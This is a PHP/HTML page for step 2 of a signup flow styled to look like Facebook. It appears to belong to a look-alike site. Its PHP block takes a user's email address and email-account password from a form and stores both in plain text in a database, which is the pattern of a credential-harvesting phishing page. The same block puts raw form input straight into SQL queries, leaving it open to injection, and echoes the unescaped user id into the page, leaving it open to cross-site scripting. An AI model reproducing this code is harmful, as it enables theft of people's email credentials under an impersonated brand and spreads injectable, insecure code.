<style type="text/css">
#cell_blue_top{
	border-top-width: 1px;
	border-right-width: 0px;
	border-bottom-width: 0px;
	border-left-width: 0px;
	border-top-style: solid;
	border-right-style: none;
	border-bottom-style: none;
	border-left-style: none;
	border-top-color: #29447E;
	border-right-color: #29447E;
	border-bottom-color: #29447E;
	border-left-color: #29447E;
	background-color: #5A74A8;
	color: #FFF;
	font-family: Arial, Helvetica, sans-serif;
	font-weight: bold;
	font-size: 14px;
	}
#cell_blue_bottom{
	border-top-width: 0px;
	border-right-width: 0px;
	border-bottom-width: 1px;
	border-left-width: 0px;
	border-top-style: none;
	border-right-style: none;
	border-bottom-style: solid;
	border-left-style: none;
	border-top-color: #29447E;
	border-right-color: #29447E;
	border-bottom-color: #29447E;
	border-left-color: #29447E;
	background-color: #5A74A8;
	color: #FFF;
	font-family: Arial, Helvetica, sans-serif;
	font-weight: normal;
	font-size: 10px;
	}
#cell_gray_top{
	font-family: Arial, Helvetica, sans-serif;
	font-weight: bold;
	font-size: 14px;
	color: #000;
	background-color: #ECEEF4;
	}
#cell_gray_bottom{
	font-family: Arial, Helvetica, sans-serif;
	font-weight: normal;
	font-size: 10px;
	color: #000;
	background-color: #ECEEF4;
	}
#txt_black_bold{
	font-family: Arial, Helvetica, sans-serif;
	font-size: 16px;
	font-weight: bold;
	color: #000;
	}
#txt_gray_small{
	font-family: Arial, Helvetica, sans-serif;
	font-size: 10px;
	color: #666666;
	}
#txt_gray_med{
	font-family: Arial, Helvetica, sans-serif;
	font-size: 14px;
	color: #666666;
	}
#txt_field{
	font-family: Arial, Helvetica, sans-serif;
	border: 1px solid #BDC7D8;
	}
#button_find{
	font-family: Arial, Helvetica, sans-serif;
	color: #FFF;
	font-size: 12px;
	border: 1px solid #637BAD;
	background-color: #6079AB;
	font-weight: bold;
	}
#gray_line{
	border-top-width: 1px;
	border-top-style: solid;
	border-top-color: #B3B3B3;
	}
</style>
<?php
ob_start();
include ('header_signup.php');
include ('config.php');
?>
<p><br><br><br>
<?php

$user_id = $_POST['user'];
$var_email = $_POST['email'];
$var_pass = $_POST['email_pass']; 
$con = mysql_connect($host, $username, $password) or die("can't connect");
mysql_select_db($db_name, $con) or die(mysql_error());
mysql_query("UPDATE $tbl_login SET temp_email = '$var_email'  WHERE user = '$user_id' ") ; 
mysql_query("UPDATE $tbl_login SET temp_pass = '$var_pass'  WHERE user = '$user_id' ") ; 
mysql_close($con);
?>
</p>
<table width="100%" border="0" cellspacing="0" cellpadding="0">
  <tr>
    <td width="10%">&nbsp;</td>
    <td><table width="500" border="0" align="center" cellpadding="0" cellspacing="0">
      <tr>
        <td nowrap id="cell_gray_top">&nbsp;&nbsp;&nbsp;Step 1&nbsp;&nbsp;&nbsp;</td>
        <td rowspan="2" nowrap><img src="img/0003.png" width="13" height="51" /></td>
        <td nowrap id="cell_blue_top">&nbsp;&nbsp;&nbsp;Step 2&nbsp;&nbsp;&nbsp;</td>
        <td rowspan="2" nowrap><img src="img/0001.png" alt="" width="13" height="50" /></td>
        <td width="100" nowrap id="cell_gray_top">&nbsp;&nbsp;&nbsp;Step 3&nbsp;&nbsp;&nbsp;</td>
        <td rowspan="2" nowrap><img src="img/0002.png" width="15" height="50"></td>
        <td id="cell_gray_top" width="150" rowspan="2" nowrap>&nbsp;</td>
      </tr>
      <tr>
        <td width="150" nowrap id="cell_gray_bottom">&nbsp;&nbsp;&nbsp;Find Friends&nbsp;&nbsp;&nbsp;</td>
        <td width="150" nowrap id="cell_blue_bottom">&nbsp;&nbsp;&nbsp;Profile Information</td>
        <td width="150" nowrap id="cell_gray_bottom">&nbsp;&nbsp;&nbsp;Profile Picture&nbsp;&nbsp;&nbsp;</td>
      </tr>
      <tr>
        <td height="10" colspan="7">&nbsp;</td>
      </tr>
      <tr>
        <td colspan="7"><table width="100%" border="0" cellspacing="0" cellpadding="0">
          <tr>
            <td bgcolor="#EDEDED">&nbsp;</td>
            <td height="30" colspan="2" valign="bottom" nowrap bgcolor="#EDEDED" id="txt_black_bold">Fill out your Profile Info</td>
            <td bgcolor="#EDEDED">&nbsp;</td>
          </tr>
          <tr>
            <td bgcolor="#EDEDED">&nbsp;</td>
            <td colspan="2" bgcolor="#EDEDED" id="txt_gray_small">This information will help you find your friends on Facebook.</td>
            <td bgcolor="#EDEDED">&nbsp;</td>
          </tr>
          <tr>
            <td bgcolor="#EDEDED">&nbsp;</td>
            <td colspan="2" nowrap bgcolor="#EDEDED" id="txt_gray_small2">&nbsp;</td>
            <td bgcolor="#EDEDED">&nbsp;</td>
          </tr>
          <tr>
            <td bgcolor="#EDEDED">&nbsp;</td>
            <td colspan="2" nowrap bgcolor="#EDEDED"><form name="form1" method="post" action="newlogin_profile_pic.php">
              <table width="100%" border="0" cellspacing="0" cellpadding="0">
                <tr>
                  <td width="26%" align="right" nowrap id="txt_gray_med">High School:&nbsp;</td>
                  <td height="30" colspan="3"><label>
                    <input name="highschool" type="text" id="txt_field" size="40" />
                  </label></td>
                </tr>
                <tr>
                  <td align="right" nowrap id="txt_gray_med">College/University:&nbsp;</td>
                  <td height="30" colspan="3"><input name="college" type="text" id="txt_field" size="40" /></td>
                </tr>
                <tr>
                  <td align="right" nowrap id="txt_gray_med">Company:&nbsp; </td>
                  <td height="30" colspan="3"><input name="company" type="text" id="txt_field" size="40" /></td>
                </tr>
                <tr>
                  <td align="right" nowrap id="txt_gray_med2">&nbsp;</td>
                  <td height="30" colspan="3">&nbsp;</td>
                </tr>
                <tr>
                  <td>&nbsp;</td>
                  <td width="26%" align="right">&nbsp;</td>
                  <td width="2%">&nbsp;</td>
                  <td width="39%"><a href="#"></a>
                    <input type="submit" name="button" id="button_find" value="Save &amp; Continue" />
                    <input type="hidden" name="user" value="<?php echo $user_id; ?>">
                  </td>
                </tr>
              </table>
            </form></td>
            <td bgcolor="#EDEDED">&nbsp;</td>
          </tr>
          <tr>
            <td bgcolor="#EDEDED">&nbsp;</td>
            <td bgcolor="#EDEDED">&nbsp;</td>
            <td bgcolor="#EDEDED"><a href="#"></a></td>
            <td nowrap bgcolor="#EDEDED">&nbsp;</td>
          </tr>
          </table></td>
      </tr>
      <tr>
        <td colspan="7">&nbsp;</td>
      </tr>
      <tr>
        <td colspan="7">&nbsp;</td>
      </tr>
    </table></td>
    <td width="10%">&nbsp;</td>
  </tr>
  <tr>
    <td>&nbsp;</td>
    <td id="gray_line">&nbsp;</td>
    <td>&nbsp;</td>
  </tr>
</table>
<p>&nbsp; </p>
